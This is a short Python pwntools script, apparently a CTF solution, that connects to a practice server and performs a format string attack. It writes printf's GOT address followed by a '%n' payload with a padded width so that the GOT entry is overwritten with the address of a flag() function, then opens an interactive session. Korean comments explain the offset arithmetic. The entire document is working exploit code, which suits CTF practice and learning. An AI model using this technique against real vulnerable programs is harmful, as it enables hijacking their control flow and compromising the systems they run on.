from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3002)
printfGot = p32(0x0804A00C)
flag = 0x080485b4 #flag함수 주소

r.recvuntil(b"input :")
r.send(printfGot+b'%134514096x'+b'%n') #134514096 = flag() dec(134514100) - got크기(4)

r.interactive()